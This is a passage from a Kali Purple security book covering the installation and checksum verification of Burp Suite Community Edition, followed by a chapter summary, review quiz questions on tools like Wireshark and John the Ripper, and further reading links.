<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.25 – Burp Suite download options and checksums</p>
<p>Within your command terminal, navigate<a id="_idIndexMarker925"/> to your <strong class="source-inline">Downloads</strong> folder by typing <strong class="source-inline">cd /Downloads</strong> and type <strong class="source-inline">ls</strong> by itself to confirm that the download is present. There should be a file with a name that is similar to <strong class="source-inline">burpsuite_community_linux_v2024_2_1_5.sh</strong>, with the year and version numbers after it differing, depending on when you’re reading this. <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.26</em> shows that there are two file hashes to choose from. You only need to use one to confirm that the download was unaltered. To confirm SHA256, you would type <strong class="source-inline">sha256 burpsuite_community_linux_v2024_2_1_5.sh</strong>; to confirm the MD5 hash, you would type <strong class="source-inline">md5sum burpsuite_community_linux_v2024_2_1_5.sh</strong>. Whichever option you choose, compare the resulting value, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.26</em>, with the value you recorded from the Burp Suite <span class="No-Break">download page:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer198">
<img alt="Figure 10.26 – Burp Suite checksum confirmation at the command line" height="192" src="image/B21223_10_26.jpg" width="615"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.26 – Burp Suite checksum confirmation at the command line</p>
<p>Since we’re reaching the end of our journey together, we’re going to show you a shortcut to launching the application while simultaneously making sure it has the necessary file permissions for us to launch. Combine <strong class="source-inline">chmod</strong> and launch the application by running <strong class="source-inline">sudo chmod +x burpsuite_community_linux_v2024_2_1_5.sh &amp;&amp; ./</strong><span class="No-Break"><strong class="source-inline">burpsuite_community_linux_v2024_2_1_5.sh</strong></span><span class="No-Break">.</span></p>
<p>You should see a pop-up window called <strong class="bold">Burp Suite Community Edition Setup Wizard</strong>. Go ahead with the process of installing it by selecting the <strong class="bold">Next &gt;</strong> button. You’ll see several screens, each with options for customization. Select <strong class="bold">Next &gt;</strong> on each screen until you get to the final screen, where you will have the option to select <strong class="bold">Finish</strong>. Do this to allow the wizard to begin extracting the Burp <span class="No-Break">Suite files.</span></p>
<p>Once you’re finished, you can launch Burp Suite similarly to how we’ve launched other applications in this chapter. As a reminder, to do so, go to the Kali dragon icon in the top-left portion of your Purple instance and either type <strong class="source-inline">Burp</strong> <strong class="source-inline">Suite</strong> in the search bar or scroll down to <strong class="bold">All Applications</strong> and observe the application populate in the window that expands to the right. Furthermore, you can try to invoke Burp Suite by simply typing <strong class="source-inline">burpsuite</strong> at the command line. However, this shortcut is not usually included in Kali Linux by default. So, you may be asked to install it either by selecting <strong class="source-inline">Y</strong> for yes and letting automation do it or by typing the full <strong class="source-inline">sudo apt install burpsuite</strong> command at the command line. Please note that this won’t install Burp Suite itself since you’ve already done that! This is only installing the command to invoke Burp Suite from the command line and the name of that command is <span class="No-Break">simply </span><span class="No-Break"><strong class="source-inline">burpsuite</strong></span><span class="No-Break">.</span></p>
<p>Once you’ve installed this command, you can type <strong class="source-inline">burpsuite</strong> at the command line to launch the application. Once <a id="_idIndexMarker926"/>you’ve done that, we recommend accepting the default values throughout the application launch process as a temporary project. The reason is that this will take you to the default dashboard where PortSwigger has provided a plethora of getting started material, video tutorials, guided tours, and a web academy. This product itself could be taught over a couple of college-level courses. These videos provide instruction far better than anything we could print here. If offensive security and pentesting are your things, we highly recommend taking the time to learn and master Burp Suite, and starting with these videos is about the best training you’ll get. It’s worth mentioning that while there is some fee-based training, plenty of <em class="italic">free</em> training is <span class="No-Break">provided here!</span></p>
<p>Let’s take a look at what we’ve learned in <span class="No-Break">this chapter!</span></p>
<h1 id="_idParaDest-176"><a id="_idTextAnchor180"/>Summary</h1>
<p>In this chapter, you continued to dig deeply into various red team tools and learned how to use them against cyber defenses. In a production setting, the SSH server we attacked would’ve had agents of some sort monitoring the activity and reporting that activity back to our blue team utilities. Data would’ve been gathered, enriched, and stored; then, when an analyst was ready, it would have been displayed through the ELK stack or perhaps one of the IDS/IPS solutions <span class="No-Break">we’ve covered.</span></p>
<p>In this chapter, we looked at some powerful web application utilities that can be used for vulnerability management to help us enhance the overall security of our web applications. We also explored a variety of reconnaissance and gaining access tools with our plethora of scanners and password-cracking utilities. This was just a taste, folks. These are the tools that Kali Purple was built to inherently support. That does not by any means suggest they are the only tools that could be of use within the Kali Purple environment – the Kali Linux operating system is designed to accommodate the customized contributions of others. That’s what keeps any software community <span class="No-Break">running strong.</span></p>
<p>In the next chapter – our final chapter, we are going to assemble some of the odds-and-ends features of Kali Purple that didn’t fully belong in the other areas. This should bring you to the end of your journey and complete your introduction to <span class="No-Break">Kali Purple.</span></p>
<h1 id="_idParaDest-177"><a id="_idTextAnchor181"/>Questions</h1>
<p>Answer the following questions to test your knowledge of <span class="No-Break">this chapter:</span></p>
<ol>
<li>Which stage of a cyberattack would be using the scanning tools we discussed <span class="No-Break">belong to?</span><ol><li class="Alphabets"><span class="No-Break">Payload delivery</span></li><li class="Alphabets"><span class="No-Break">Exploitation</span></li><li class="Alphabets"><span class="No-Break">Recovery</span></li><li class="Alphabets"><span class="No-Break">Reconnaissance</span></li></ol></li>
<li>What <span class="No-Break">is Wireshark?</span><ol><li class="Alphabets">A <span class="No-Break">protocol analyzer</span></li><li class="Alphabets">A Mafia-linked <span class="No-Break">loan officer</span></li><li class="Alphabets">A physical <span class="No-Break">cable tap</span></li><li class="Alphabets">A network <span class="No-Break">packet generator</span></li></ol></li>
<li>What is John <span class="No-Break">the Ripper?</span><ol><li class="Alphabets">Jack’s <span class="No-Break">older brother</span></li><li class="Alphabets">A password and <span class="No-Break">hash-cracking utility</span></li><li class="Alphabets">A network <span class="No-Break">packet disassembler</span></li><li class="Alphabets">A WAF <span class="No-Break">bypass exploit</span></li></ol></li>
<li>What do you suppose would happen if the password you are trying to crack isn’t on the wordlist that’s being invoked by your <span class="No-Break">cracking utility?</span><ol><li class="Alphabets">The utility will automatically restart using values from the next wordlist in <span class="No-Break">the directory</span></li><li class="Alphabets">The utility will complete the scan from the wordlist and then just make random stuff up, trying to guess <span class="No-Break">the password</span></li><li class="Alphabets">The password will not be successfully cracked, and you’ll need to find another list or method to complete <span class="No-Break">your objective</span></li><li class="Alphabets">The password-cracking utility will become enraged and automatically switch to brute force via dictionary and fuzz <span class="No-Break">value testing</span></li></ol></li>
<li>Which utility is most <span class="No-Break">like ZAP?</span><ol><li class="Alphabets"><span class="No-Break">Google Chrome</span></li><li class="Alphabets"><span class="No-Break">Mozilla Firefox</span></li><li class="Alphabets"><span class="No-Break">Portswigger</span></li><li class="Alphabets"><span class="No-Break">Burp Suite</span></li></ol></li>
</ol>
<h1 id="_idParaDest-178"><a id="_idTextAnchor182"/>Further reading</h1>
<p>To learn more about the topics that were covered in this chapter, take a look at the <span class="No-Break">following resources:</span></p>
<ul>
<li><strong class="bold">Global Information Assurance Wireshark </strong><span class="No-Break"><strong class="bold">paper</strong></span><span class="No-Break">: </span><a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf"><span class="No-Break">https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf</span></a></li>
<li><strong class="bold">What Is Wireshark and How Is It </strong><span class="No-Break"><strong class="bold">Used?</strong></span><span class="No-Break">: </span><a href="https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it"><span class="No-Break">https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it</span></a></li>
<li><strong class="bold">Tenable’s Nessus vulnerability </strong><span class="No-Break"><strong class="bold">scanner</strong></span><span class="No-Break">:</span><span class="No-Break"><span class="P---URL"> </span></span><a href="https://www.tenable.com/products/nessus"><span class="No-Break">https://www.tenable.com/products/nessus</span></a></li>
</ul>
</div>
</div></body></html>